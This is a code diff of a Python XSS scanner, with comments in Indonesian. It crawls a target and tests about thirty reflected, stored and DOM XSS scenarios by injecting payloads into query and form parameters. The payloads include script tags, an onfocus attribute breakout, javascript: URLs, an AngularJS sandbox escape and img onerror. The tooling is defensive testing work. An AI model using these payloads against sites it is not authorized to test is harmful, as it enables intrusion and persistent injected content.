@@ -488,8 +488,12 @@ def _csp_is_strict(csp: str) -> bool:
 # Scanner
 # ---------------------------------------------------------------------------
 class SatriaXSSScanner:
-    # Batas request per lab: menjamin lab 26-30 tetap kebagian anggaran.
-    LAB_REQUEST_CAP = 18
+    """
+    Scanner 30 vektor XSS. Prinsip: buktikan eksekutabilitas/konteks nyata,
+    jangan menebak dari pola global. Setiap lab punya detektor mandiri.
+    """
+
+    LAB_REQUEST_CAP = 22
 
     def __init__(
         self,
@@ -497,9 +501,9 @@ class SatriaXSSScanner:
         *,
         authorized: bool = False,
         allow_private: bool = False,
-        max_pages: int = 10,
-        max_points: int = 24,
-        max_requests: int = 900,
+        max_pages: int = 12,
+        max_points: int = 32,
+        max_requests: int = 1200,
         timeout: float = 8.0,
         time_delay: float = 0.0,
         seed_html: str | None = None,
@@ -512,23 +516,25 @@ class SatriaXSSScanner:
         if requests is None:
             raise RuntimeError("Library 'requests' belum terpasang.")
 
-        self.max_pages = max(1, min(int(max_pages), 40))
-        self.max_points = max(4, min(int(max_points), 80))
-        self.max_requests = max(120, min(int(max_requests), 5000))
+        self.max_pages = max(1, min(int(max_pages), 50))
+        self.max_points = max(6, min(int(max_points), 120))
+        self.max_requests = max(150, min(int(max_requests), 6000))
         self.timeout = max(3.0, min(float(timeout), 30.0))
         self.time_delay = max(0.0, min(float(time_delay), 5.0))
         self.seed_html = seed_html or None
+
         self.request_count = 0
         self.started = time.monotonic()
         try:
-            self.deadline_seconds = float(globals().get("SCAN_DEADLINE_SECONDS") or 600.0)
+            self.deadline_seconds = float(globals().get("SCAN_DEADLINE_SECONDS") or 900.0)
         except (TypeError, ValueError):
-            self.deadline_seconds = 600.0
+            self.deadline_seconds = 900.0
 
         self.session = requests.Session()
         self.session.headers.update({
             "User-Agent": USER_AGENT,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.7,id;q=0.5",
             "Cache-Control": "no-cache",
         })
         self.pages: list[Page] = []
@@ -538,89 +544,78 @@ class SatriaXSSScanner:
         self._dom_cache: list[tuple[str, str]] | None = None
         self._set_cookies: list[str] = []
         self._csp_header = ""
-
-        self._probe_cache: dict[str, tuple[bool, str, dict]] = {}
-        self._probe_miss: set[str] = set()
-        self._preferred: Point | None = None
-        self._fp: dict[str, Any] | None = None
-        self._tag_cache: dict[str, bool] = {}
-        self._claims: dict[str, bool] = {}
+        self._send_cache: dict[tuple[str, str], tuple[str, dict[str, Any]] | None] = {}
+        self._point_enc: dict[str, dict[str, str]] = {}
+        self._claims: set[str] = set()
+        self._tag_cache: dict[tuple[str, str], bool] = {}
         self._lab_id = 0
         self._lab_used = 0
         self._results: dict[int, dict[str, Any]] = {}
 
-    # ---- Budget ----
     def _deadline_hit(self) -> bool:
         return (time.monotonic() - self.started) >= self.deadline_seconds
 
-    def _lab_budget(self) -> bool:
+    def _lab_budget(self, reserve_per_remaining: int = 4) -> bool:
         if self._lab_used >= self.LAB_REQUEST_CAP:
             return False
-        remaining_labs = max(0, len(CATALOG) - self._lab_id)
-        if self.request_count + remaining_labs * 3 >= self.max_requests:
+        if self._deadline_hit():
             return False
-        return not self._deadline_hit()
+        remaining = max(0, len(CATALOG) - self._lab_id)
+        if self.request_count + remaining * reserve_per_remaining >= self.max_requests:
+            return False
+        return True
 
-    # ---- HTTP ----
+    def _global_budget(self) -> bool:
+        return self.request_count < self.max_requests and not self._deadline_hit()
+
     def _same_origin(self, url: str) -> bool:
         return _same_origin(url, self.target_url)
 
-    def _request(
-        self,
-        method: str,
-        url: str,
-        *,
-        params: dict[str, str] | None = None,
-        data: dict[str, str] | None = None,
-        allow_redirects: bool = True,
-    ) -> Response:
-        if self.request_count >= self.max_requests:
+    def _request(self, method: str, url: str, *, params=None, data=None, allow_redirects=True) -> Response:
+        if not self._global_budget():
             return Response(None, url, "", {}, 0.0, "budget_exceeded")
-        if self._deadline_hit():
-            return Response(None, url, "", {}, 0.0, "deadline_exceeded")
         self.request_count += 1
         self._lab_used += 1
         self.stats["requests"] = self.request_count
+        if self.time_delay > 0:
+            time.sleep(self.time_delay)
         started = time.monotonic()
         try:
-            raw = self.session.request(
-                method.upper(), url, params=params, data=data,
-                timeout=self.timeout, allow_redirects=allow_redirects, verify=True,
-            )
+            raw = self.session.request(method.upper(), url, params=params, data=data,
+                                       timeout=self.timeout, allow_redirects=allow_redirects, verify=True)
             elapsed = time.monotonic() - started
             headers = {str(k): str(v) for k, v in (raw.headers or {}).items()}
             text = raw.text or ""
-            if len(text) > 800_000:
-                text = text[:800_000]
-            if not self._csp_header:
-                self._csp_header = headers.get("Content-Security-Policy") or headers.get("content-security-policy") or ""
-            set_cookie = headers.get("Set-Cookie") or headers.get("set-cookie") or ""
-            if set_cookie:
-                self._set_cookies.append(set_cookie)
+            if len(text) > 900000:
+                text = text[:900000]
+            for key, value in headers.items():
+                lk = key.lower()
+                if lk == "content-security-policy" and not self._csp_header:
+                    self._csp_header = value
+                if lk == "set-cookie":
+                    self._set_cookies.append(value)
             return Response(raw.status_code, str(raw.url), text, headers, elapsed)
         except Exception as exc:
             elapsed = time.monotonic() - started
-            message = type(exc).__name__ + ": " + str(exc)
-            if len(self.stats["errors"]) < 40:
-                self.stats["errors"].append(message[:200])
-            return Response(None, url, "", {}, elapsed, message)
+            msg = type(exc).__name__ + ": " + str(exc)
+            if len(self.stats["errors"]) < 60:
+                self.stats["errors"].append(msg[:220])
+            return Response(None, url, "", {}, elapsed, msg)
 
-    def _get(self, url: str, params: dict[str, str] | None = None) -> Response:
+    def _get(self, url: str, params=None) -> Response:
         return self._request("GET", url, params=params)
 
-    def _post(self, url: str, data: dict[str, str] | None = None) -> Response:
+    def _post(self, url: str, data=None) -> Response:
         return self._request("POST", url, data=data)
 
-    # ---- Crawl ----
     def _crawl(self) -> None:
         seen: set[str] = set()
         if self.seed_html:
             seeded = self._parse_page(self.target_url, Response(200, self.target_url, self.seed_html, {}, 0.0))
             self.pages.append(seeded)
             seen.add(self.target_url.split("#", 1)[0])
-
-        queue: deque[str] = deque([self.target_url])
-        while queue and len(self.pages) < self.max_pages and not self._deadline_hit():
+        queue = deque([self.target_url])
+        while queue and len(self.pages) < self.max_pages and self._global_budget():
             url = queue.popleft()
             canon = url.split("#", 1)[0]
             if canon in seen or not self._same_origin(canon) or _is_destructive(canon):
@@ -633,9 +628,9 @@ class SatriaXSSScanner:
             page = self._parse_page(canon, response)
             self.pages.append(page)
             for link in page.links:
-                if link not in seen:
-                    queue.append(link)
-
+                lc = link.split("#", 1)[0]
+                if lc not in seen:
+                    queue.append(lc)
         if not self.pages:
             response = self._get(self.target_url)
             self.pages.append(self._parse_page(self.target_url, response))
@@ -668,7 +663,7 @@ class SatriaXSSScanner:
                 method = (form.get("method") or "GET").upper()
                 if method not in ("GET", "POST"):
                     method = "GET"
-                fields: list[tuple[str, str, str]] = []
+                fields = []
                 has_password = False
                 for element in form.find_all(["input", "textarea", "select"]):
                     name = element.get("name")
@@ -683,799 +678,750 @@ class SatriaXSSScanner:
                     if element.name == "textarea":
                         value = element.text or value
                     fields.append((str(name), str(value), input_type))
-                forms.append(FormSpec(page_url=url, action=action, method=method,
-                                      fields=tuple(fields), has_password=has_password))
+                if fields:
+                    forms.append(FormSpec(page_url=url, action=action, method=method,
+                                          fields=tuple(fields), has_password=has_password))
         except Exception:
             pass
-
-        unique_links: list[str] = []
-        seen_links: set[str] = set()
+        unique_links = []
+        seen_links = set()
         for link in links:
             if link not in seen_links:
                 seen_links.add(link)
                 unique_links.append(link)
-        return Page(url=url, text=text, links=unique_links[:200], forms=forms[:50],
+        return Page(url=url, text=text, links=unique_links[:250], forms=forms[:60],
                     status=response.status, headers=response.headers or {})
 
     def _discover_points(self) -> None:
-        points: list[Point] = []
-        seen: set[str] = set()
-
-        def add(point: Point) -> None:
-            if point.key in seen:
-                return
-            seen.add(point.key)
-            points.append(point)
-
+        points = []
+        seen = set()
+        def add(point):
+            if point.key not in seen:
+                seen.add(point.key); points.append(point)
         for page in self.pages:
             try:
-                parsed = urlparse(page.url)
-                for name, value in parse_qsl(parsed.query, keep_blank_values=True):
-                    add(Point(key="q|" + parsed.path + "|" + name, kind="query", label="query:" + name,
+                for name, value in parse_qsl(urlparse(page.url).query, keep_blank_values=True):
+                    add(Point(key="q|"+urlparse(page.url).path+"|"+name, kind="query", label="query:"+name,
                               url=page.url, name=name, original=value, page_url=page.url, method="GET"))
-            except Exception:
-                pass
+            except Exception: pass
             for link in page.links:
                 try:
-                    parsed = urlparse(link)
-                    for name, value in parse_qsl(parsed.query, keep_blank_values=True):
-                        add(Point(key="l|" + parsed.path + "|" + name, kind="query", label="query:" + name,
+                    for name, value in parse_qsl(urlparse(link).query, keep_blank_values=True):
+                        add(Point(key="l|"+urlparse(link).path+"|"+name, kind="query", label="query:"+name,
                                   url=link, name=name, original=value, page_url=page.url, method="GET"))
-                except Exception:
-                    pass
+                except Exception: pass
             for form in page.forms:
-                for name, value, _input_type in form.fields:
-                    add(Point(key="f|" + form.action + "|" + form.method + "|" + name, kind="form",
-                              label="form:" + name, url=form.action, name=name, original=value,
-                              page_url=page.url, method=form.method, fields=form.fields))
-
+                for name, value, _itype in form.fields:
+                    add(Point(key="f|"+form.action+"|"+form.method+"|"+name, kind="form",
+                              label="form:"+name+"@"+form.method, url=form.action, name=name,
+                              original=value, page_url=page.url, method=form.method, fields=form.fields))
         if not points:
-            points.append(Point(key="synthetic|" + self.target_url + "|q", kind="query", label="query:q",
-                                url=self.target_url, name="q", original="", page_url=self.target_url,
-                                method="GET", synthetic=True))
-
-        def score(point: Point) -> int:
-            name = point.name.lower()
-            value = 0
-            if name in ("q", "search", "query", "s", "term", "keyword", "name"):
-                value -= 40
-            if point.kind == "query":
-                value -= 4
-            if any(key in name for key in ("comment", "message", "content", "body", "text",
-                                           "url", "website", "redirect", "next", "page")):
-                value -= 8
-            return value
-
-        points.sort(key=score)
+            points.append(Point(key="synthetic|q", kind="query", label="query:q", url=self.target_url,
+                                name="q", original="", page_url=self.target_url, method="GET", synthetic=True))
+        def sc(p):
+            n = p.name.lower(); v = 0
+            if n in ("q","search","query","s","term","keyword","id","name","page","url","redirect","next","return","returnurl","path","file","view","msg","message"): v -= 50
+            if p.kind == "query": v -= 6
+            if any(k in n for k in ("comment","content","body","text","input","value","data","desc")): v -= 10
+            if p.synthetic: v += 5
+            return v
+        points.sort(key=sc)
         self.points = points[:self.max_points]
 
     def _send_point(self, point: Point, value: str) -> Response:
         if point.kind == "query":
             try:
                 parsed = urlparse(point.url)
-                pairs = [(k, value if k == point.name else v)
-                         for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
-                if not any(k == point.name for k, _ in pairs):
-                    pairs.append((point.name, value))
-                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params,
-                                      urlencode(pairs, doseq=True), parsed.fragment))
+                pairs = [(k, value if k == point.name else v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)]
+                if not any(k == point.name for k, _ in pairs): pairs.append((point.name, value))
+                new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(pairs, doseq=True), parsed.fragment))
                 return self._get(new_url)
             except Exception as exc:
                 return Response(None, point.url, "", {}, 0.0, str(exc))
-        data: dict[str, str] = {}
-        for name, original, _input_type in point.fields:
-            data[name] = original
+        data = {n: o for n, o, _ in point.fields}
         data[point.name] = value
-        if point.method == "POST":
-            return self._post(point.url, data=data)
-        return self._get(point.url, params=data)
+        return self._post(point.url, data=data) if point.method == "POST" else self._get(point.url, params=data)
 
-    # ---- Probe engine ----
-    def _candidate_points(self) -> list[Point]:
-        ordered: list[Point] = []
-        if self._preferred is not None and self._preferred in self.points:
-            ordered.append(self._preferred)
+    def _send(self, point: Point, payload: str):
+        ck = (point.key, payload)
+        if ck in self._send_cache:
+            c = self._send_cache[ck]
+            return (c[0], c[1]) if c else (None, {})
+        if not self._lab_budget(): return None, {}
+        response = self._send_point(point, payload)
+        body = response.text or ""
+        meta = {"point": point.label, "url": response.url or point.url, "key": point.key, "method": point.method, "status": response.status}
+        if body:
+            self._send_cache[ck] = (body, meta); return body, meta
+        self._send_cache[ck] = None; return None, meta
 
-        def score(point: Point) -> int:
-            name = point.name.lower()
-            value = 0
-            if name in ("q", "search", "query", "s", "term", "keyword"):
-                value -= 40
-            if point.kind == "query":
-                value -= 5
-            return value
+    def _reflects(self, point: Point, marker: str, payload: str):
+        body, meta = self._send(point, payload)
+        if body and marker in body: return body, meta
+        return None, meta
 
-        for point in sorted(self.points, key=score):
-            if point not in ordered:
-                ordered.append(point)
-        return ordered
+    def _ranked_points(self):
+        def s(p):
+            n = p.name.lower(); v = 0
+            if n in ("q","search","query","s","term","keyword","name","id","page","url","redirect","next","returnurl","return","path","file","view","msg"): v -= 30
+            if p.kind == "query": v -= 4
+            return v
+        return sorted(self.points, key=s)
 
-    def _probe(self, payload: str) -> tuple[bool, str, dict[str, Any]]:
-        """Kirim payload ke titik refleksi terbaik; hasil di-cache per payload."""
-        if payload in self._probe_cache:
-            return self._probe_cache[payload]
-        if payload in self._probe_miss:
-            return False, "", {}
-        marker = _marker_of(payload)
-        if not marker:
-            self._probe_miss.add(payload)
-            return False, "", {}
-
-        tried = 0
-        for point in self._candidate_points():
-            if not self._lab_budget():
-                break
-            response = self._send_point(point, payload)
-            body = response.text or ""
-            if marker in body:
-                self._preferred = point
-                meta = {"point": point.label, "url": response.url or point.url, "key": point.key}
-                self._probe_cache[payload] = (True, body, meta)
-                return self._probe_cache[payload]
-            tried += 1
-            if tried >= 3:
-                break
-        self._probe_miss.add(payload)
-        return False, "", {}
-
-    def _ensure_fingerprint(self) -> dict[str, Any]:
-        if self._fp is not None:
-            return self._fp
+    def _encoding_at_point(self, point: Point):
+        if point.key in self._point_enc: return self._point_enc[point.key]
         token = _random_token()
-        order = ['"', "<", ">", "`", "\\", "'", "&"]
-        probe = token + '"<>' + "`" + "\\" + "'" + "&"
-        ok, body, meta = self._probe(probe)
-        fingerprint: dict[str, Any] = {}
-        if ok:
-            index = body.find(token)
-            tail = body[index + len(token): index + len(token) + 48]
-            cursor = 0
-            for char in order:
-                result, used = _match_encoding(tail, cursor, char)
-                fingerprint[char] = result
-                cursor += used
+        probe = token + '"<>' + "`" + "\\'" + "&"
+        body, _ = self._send(point, probe)
+        result = {}
+        order = ['"', '<', '>', '`', '\\', "'", '&']
+        if body and token in body:
+            tail = body[body.find(token)+len(token): body.find(token)+len(token)+60]
+            cur = 0
+            for ch in order:
+                st, used = _match_encoding(tail, cur, ch); result[ch] = st; cur += used
         else:
-            for char in order:
-                fingerprint[char] = "absent"
-        fingerprint["_point"] = meta.get("point")
-        fingerprint["_url"] = meta.get("url")
-        self._fp = fingerprint
-        return fingerprint
+            for ch in order: result[ch] = "absent"
+        self._point_enc[point.key] = result
+        return result
 
-    def _fp_is(self, char: str, state: str) -> bool:
-        return self._ensure_fingerprint().get(char) == state
-
-    def _claim(self, signature: str) -> bool:
-        if signature in self._claims:
-            return False
-        self._claims[signature] = True
-        return True
-
+    def _enc(self, point, char, state): return self._encoding_at_point(point).get(char) == state
+    def _claim(self, lab_id, point_key, sig):
+        k = f"{lab_id}|{point_key}|{sig}"
+        if k in self._claims: return False
+        self._claims.add(k); return True
     @staticmethod
-    def _no(reason: str) -> tuple[bool, str, dict[str, Any]]:
-        return False, reason, {}
+    def _no(reason): return False, reason, {}
+    @staticmethod
+    def _yes(ev, det): return True, ev, det
 
-    # ---- Form/stored helper ----
-    def _form_points(self) -> list[Point]:
-        points = [p for p in self.points if p.kind == "form"]
+    def _form_points(self):
+        fps = [p for p in self.points if p.kind == "form"]
+        def sc(p):
+            n = p.name.lower(); v = 0
+            if any(k in n for k in ("comment","message","feedback","post","content","body","text","name","title","desc","bio","website","url","email","search")): v -= 20
+            if any(k in n for k in ("csrf","token","nonce","_token","authenticity","captcha")): v += 40
+            return v
+        return sorted(fps, key=sc)
 
-        def score(point: Point) -> int:
-            name = point.name.lower()
-            value = 0
-            if any(key in name for key in ("comment", "message", "feedback", "post", "content",
-                                           "body", "text", "name", "website", "url", "email", "title")):
-                value -= 20
-            if any(key in name for key in ("password", "passwd", "login", "user")):
-                value += 30
-            return value
+    def _recheck_urls(self, point):
+        urls = []
+        for u in (point.page_url, point.url):
+            cu = (u or "").split("#",1)[0]
+            if cu and cu not in urls: urls.append(cu)
+        try:
+            ppath = urlparse(point.page_url).path
+            for page in self.pages:
+                if urlparse(page.url).path == ppath and page.url not in urls: urls.append(page.url)
+        except Exception: pass
+        if self.target_url not in urls: urls.append(self.target_url)
+        return urls[:5]
 
-        return sorted(points, key=score)
-
-    def _recheck_urls(self, point: Point) -> list[str]:
-        urls: list[str] = []
-        for url in (point.page_url, point.url):
-            if url and url not in urls:
-                urls.append(url)
-        for page in self.pages:
-            if page.url not in urls and urlparse(page.url).path == urlparse(point.page_url).path:
-                urls.append(page.url)
-        return urls[:3]
-
-    def _stored_probe(self, payload: str, checker: Callable[[str, str, str], bool]) -> tuple[bool, str, dict[str, Any]]:
-        marker = _marker_of(payload)
-        if not marker:
-            return self._no("Marker payload tidak valid.")
-        for point in self._form_points()[:4]:
-            if not self._lab_budget():
-                break
-            self._send_point(point, payload)
+    def _stored_check(self, payload_builder, checker, max_forms=6):
+        forms = self._form_points()[:max_forms]
+        if not forms: return self._no("Tidak ditemukan form input untuk pengujian stored XSS.")
+        for point in forms:
+            if not self._lab_budget(): break
+            marker = _random_token(); payload = payload_builder(marker)
+            self._send(point, payload)
             for url in self._recheck_urls(point):
-                if not self._lab_budget():
-                    break
-                response = self._get(url)
-                body = response.text or ""
+                if not self._lab_budget(): break
+                r = self._get(url); body = r.text or ""
                 if marker in body and checker(body, payload, marker):
-                    return True, (
-                        "Payload tersimpan lalu ter-render ulang di " + url
-                        + " (form " + point.label + ")."
-                    ), {"point": point.label, "url": url, "marker": marker}
-        return self._no("Tidak ada bukti persistensi (stored) pada form yang diuji.")
+                    return True, f"Payload tersimpan via {point.label} dan ter-render di {url}.", {"point": point.label, "url": url, "marker": marker}
+        return self._no("Tidak ada bukti persistensi (stored) yang terkonfirmasi.")
 
-    # ---- DOM helper ----
-    def _dom_blocks(self) -> list[tuple[str, str]]:
-        if self._dom_cache is not None:
-            return self._dom_cache
-        blocks: list[tuple[str, str]] = []
+    def _dom_blocks(self):
+        if self._dom_cache is not None: return self._dom_cache
+        blocks = []
         for page in self.pages:
-            for code in _inline_scripts(page.text or ""):
-                blocks.append((page.url, code))
-        for src in self._script_srcs[:4]:
-            if not self._lab_budget():
-                break
-            response = self._get(src)
-            if response.text:
-                blocks.append((src, response.text))
-        self._dom_cache = blocks
-        return blocks
+            for code in _inline_scripts(page.text or ""): blocks.append((page.url, code))
+        for src in self._script_srcs[:8]:
+            if not self._global_budget(): break
+            try:
+                r = self.session.get(src, timeout=min(self.timeout,6.0), verify=True)
+                if getattr(r,'ok',False) and r.text:
+                    t = r.text; blocks.append((src, t[:350000] if len(t)>350000 else t))
+            except Exception: pass
+        self._dom_cache = blocks; return blocks
 
-    def _angular_scopes(self) -> list[tuple[str, int, int]]:
-        scopes: list[tuple[str, int, int]] = []
+    def _dom_evidence(self, source_res, sink_res, proximity=700):
+        hits = []
+        for url, js in self._dom_blocks():
+            if not any(re.search(r, js, re.I) for r in source_res): continue
+            if not any(re.search(r, js, re.I) for r in sink_res): continue
+            found = False
+            for sm in re.finditer("|".join(source_res), js, re.I):
+                win = js[max(0,sm.start()-100): sm.start()+proximity]
+                if any(re.search(r, win, re.I) for r in sink_res):
+                    hits.append((url, win[:200].replace("\n"," ").replace("\r"," "))); found=True; break
+            if not found:
+                hits.append((url, js[:180].replace("\n"," ")))
+        return hits
+
+    def _angular_scopes(self):
+        scopes = []
         for page in self.pages:
             body = page.text or ""
-            for match in re.finditer(r"<([a-zA-Z][\w-]*)[^>]*\bng-app\b[^>]*>", body):
-                tag = match.group(1).lower()
-                end = body.find("</" + tag, match.end())
-                scopes.append((page.url, match.end(), end if end != -1 else len(body)))
+            for m in re.finditer(r"<([a-zA-Z][\w-]*)[^>]*\b(?:data-)?ng-app\b[^>]*>", body):
+                tag = m.group(1).lower(); end = body.lower().find("</"+tag, m.end())
+                scopes.append((page.url, m.end(), end if end!=-1 else len(body)))
         return scopes
 
-    def _angular_present(self) -> bool:
-        return bool(self._angular_scopes())
-
-    # =======================================================================
-    # 30 lab
-    # =======================================================================
-    def _lab_01(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "<script>alert('" + marker + "')</script>"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload <script> tidak ter-refleksi pada titik uji yang ditemukan.")
-        if not (self._fp_is("<", "raw") and self._fp_is(">", "raw")):
-            return self._no("Karakter < > di-encode/dihapus, sehingga tag <script> mentah tidak dapat dieksekusi.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or ctx["in_script"] or ctx["in_tag"] or ctx["in_comment"]:
-                continue
-            if ctx["parent_tag"] in _NON_EXEC_TEXT:
-                continue
-            if self._claim("html_text:" + str(meta.get("key"))):
-                return True, "Payload <script> ter-refleksi mentah pada konteks teks HTML di " + str(meta.get("url")) + ".", {
-                    "context": "html_text", **meta}
-        return self._no("Refleksi ada, tetapi bukan <script> mentah pada konteks teks HTML yang dapat dieksekusi.")
-
-    def _lab_02(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "<script>alert('" + marker + "')</script>"
-
-        def checker(body: str, _payload: str, mk: str) -> bool:
-            for ctx in _analyze_reflection(body, payload, mk):
-                if ctx["exact"] and not ctx["in_script"] and not ctx["in_tag"] and not ctx["in_comment"]:
-                    if ctx["parent_tag"] not in _NON_EXEC_TEXT:
-                        return True
-            return False
-
-        return self._stored_probe(payload, checker)
-
-    def _lab_03(self) -> tuple[bool, str, dict[str, Any]]:
-        for url, js in self._dom_blocks():
-            if not re.search(r"document\.write(?:ln)?\s*\(", js):
-                continue
-            if not re.search(r"location\.(?:search|href)|URLSearchParams|document\.URL", js):
-                continue
-            if re.search(r"<select", js, re.I):
-                continue  # vektor 10 yang memiliki kasus <select>
-            return True, "Sink document.write() menerima data dari location.search pada skrip " + url + ".", {
-                "url": url, "sink": "document.write", "source": "location.search"}
-        return self._no("Tidak ditemukan alur location.search -> document.write pada skrip yang dipindai.")
-
-    def _lab_04(self) -> tuple[bool, str, dict[str, Any]]:
-        for url, js in self._dom_blocks():
-            if not re.search(r"\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML\s*\(", js):
-                continue
-            if not re.search(r"location\.(?:search|href)|URLSearchParams|document\.URL", js):
-                continue
-            return True, "Sink innerHTML/insertAdjacentHTML dialiri location.search pada skrip " + url + ".", {
-                "url": url, "sink": "innerHTML", "source": "location.search"}
-        return self._no("Tidak ditemukan alur location.search -> innerHTML pada skrip yang dipindai.")
-
-    def _lab_05(self) -> tuple[bool, str, dict[str, Any]]:
-        for url, js in self._dom_blocks():
-            if not re.search(r"location\.search|URLSearchParams", js):
-                continue
-            if not re.search(r"\.attr\(\s*['\"]href['\"]|\.href\s*=|\$\([^)]*\)\.prop\(\s*['\"]href['\"]", js):
-                continue
-            return True, "Sink atribut href (jQuery/DOM) dialiri location.search pada skrip " + url + ".", {
-                "url": url, "sink": "anchor.href", "source": "location.search"}
-        return self._no("Tidak ditemukan alur location.search -> atribut href pada skrip yang dipindai.")
-
-    def _lab_06(self) -> tuple[bool, str, dict[str, Any]]:
-        for url, js in self._dom_blocks():
-            if not re.search(r"hashchange|location\.hash", js):
-                continue
-            if not re.search(r"\$\(|jQuery", js):
-                continue
-            if not re.search(r"\$\(\s*[^)]*hash|location\.hash", js):
-                continue
-            return True, "Selector jQuery memakai location.hash/hashchange sebagai sumber pada skrip " + url + ".", {
-                "url": url, "sink": "jQuery.selector", "source": "location.hash"}
-        return self._no("Tidak ditemukan alur location.hash -> selector jQuery pada skrip yang dipindai.")
-
-    def _lab_07(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = '" autofocus onfocus=alert(' + "'" + marker + "'" + ') x="'
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload breakout atribut tidak ter-refleksi.")
-        if self._fp_is("<", "raw") or self._fp_is(">", "raw"):
-            return self._no("Angle bracket tidak di-encode; ini bukan skenario atribut dengan < > ter-encode.")
-        if not self._fp_is('"', "raw"):
-            return self._no("Kutip ganda ikut di-encode; breakout atribut tidak terkonfirmasi.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_tag"]:
-                continue
-            if not re.search(r"onfocus\s*=\s*alert\(", body, re.I):
-                continue
-            if self._claim("attr_breakout:" + str(meta.get("key"))):
-                return True, "Breakout atribut berhasil: < > di-encode tetapi kutip ganda mentah sehingga handler onfocus menjadi atribut baru.", {
-                    "context": "attribute_breakout", **meta}
-        return self._no("Tidak ada breakout atribut dengan angle bracket ter-encode.")
-
-    def _lab_08(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "javascript:alert('" + marker + "')"
-
-        def checker(body: str, _payload: str, mk: str) -> bool:
-            for tag in re.findall(r"<a\b[^>]*>", body, re.I | re.S):
-                if mk in tag and re.search(r"href\s*=\s*['\"][^'\"]*javascript:", tag, re.I):
-                    return True
-            return False
-
-        result = self._stored_probe(payload, checker)
-        if result[0]:
-            return result[0], result[1] + " Atribut href menerima skema javascript: meski kutip ganda di-encode.", result[2]
-        return result
-
-    def _lab_09(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "'-alert('" + marker + "')-'"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload string JS tidak ter-refleksi.")
-        if self._fp_is("<", "raw") or self._fp_is(">", "raw"):
-            return self._no("Angle bracket tidak di-encode; bukan skenario 'angle brackets HTML encoded'.")
-        if not self._fp_is("'", "raw"):
-            return self._no("Kutip tunggal di-encode, sehingga breakout string tidak terkonfirmasi.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_script"]:
-                continue
-            if ctx["js"] not in ("sq", "dq"):
-                continue
-            if self._claim("js_sq:" + str(meta.get("key"))):
-                return True, "Payload keluar dari string JavaScript (kutip tunggal mentah, < > ter-encode) di " + str(meta.get("url")) + ".", {
-                    "context": "js_string_single_quote", **meta}
-        return self._no("Tidak ada breakout string JavaScript dengan angle bracket ter-encode.")
-
-    def _lab_10(self) -> tuple[bool, str, dict[str, Any]]:
-        for url, js in self._dom_blocks():
-            if not re.search(r"document\.write(?:ln)?\s*\(", js):
-                continue
-            if not re.search(r"<select", js, re.I):
-                continue
-            if not re.search(r"location\.(?:search|href)|URLSearchParams", js):
-                continue
-            return True, "document.write(location.search) menulis ke dalam elemen <select> pada skrip " + url + ".", {
-                "url": url, "sink": "document.write(select)", "source": "location.search"}
-        return self._no("Tidak ditemukan document.write ke dalam <select> yang dialiri location.search.")
-
-    def _lab_11(self) -> tuple[bool, str, dict[str, Any]]:
-        if not self._angular_present():
-            return self._no("Tidak ada elemen dengan ng-app; ekspresi AngularJS tidak dievaluasi.")
-        if self._fp_is("<", "raw"):
-            return self._no("Angle bracket tidak di-encode; bukan skenario ekspresi AngularJS ter-encode.")
-        marker = _random_token()
-        payload = "{{constructor.constructor('alert(1)')()}}" + marker
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Ekspresi AngularJS tidak ter-refleksi.")
-        scopes = self._angular_scopes()
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or ctx["in_script"]:
-                continue
-            if not any(start <= ctx["pos"] <= end for _url, start, end in scopes):
-                continue
-            return True, "Ekspresi {{...}} ter-refleksi mentah di dalam scope ng-app; AngularJS akan mengevaluasinya.", {
-                "context": "angular_expression", **meta}
-        return self._no("Ekspresi AngularJS tidak ter-refleksi di dalam scope ng-app.")
-
-    def _lab_12(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "<img src=x onerror=alert('" + marker + "')>"
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload tidak ter-refleksi; alur reflected-DOM tidak dapat diverifikasi.")
-        sink_blocks = [
-            (url, js) for url, js in self._dom_blocks()
-            if re.search(r"innerHTML|insertAdjacentHTML|document\.write|eval\s*\(|JSON\.parse", js)
-        ]
-        if not sink_blocks:
-            return self._no("Tidak ditemukan sink DOM pada skrip klien.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or ctx["in_comment"] or not ctx["in_script"]:
-                continue
-            if self._claim("reflected_dom:" + str(meta.get("key"))):
-                return True, "Payload ter-refleksi ke dalam blok <script> dan halaman memiliki sink DOM (" + sink_blocks[0][0] + ").", {
-                    "context": "reflected_dom", "sink_page": sink_blocks[0][0], **meta}
-        return self._no("Refleksi tidak berada di dalam blok script yang terhubung ke sink DOM.")
-
-    def _lab_13(self) -> tuple[bool, str, dict[str, Any]]:
-        marker = _random_token()
-        payload = "<img src=x onerror=alert('" + marker + "')>"
-
-        def checker(body: str, p: str, mk: str) -> bool:
-            if not re.search(r"innerHTML|insertAdjacentHTML|document\.write", body, re.I):
-                return False
-            for ctx in _analyze_reflection(body, p, mk):
-                if ctx["exact"] and ctx["in_script"]:
-                    return True
-            return False
-
-        return self._stored_probe(payload, checker)
-
-    def _tag_allowed(self, tag: str) -> bool:
-        key = "tag:" + tag
-        if key in self._tag_cache:
-            return self._tag_cache[key]
-        marker = _random_token()
-        payload = "<" + tag + " data-sx=" + marker + ">"
-        ok, body, _meta = self._probe(payload)
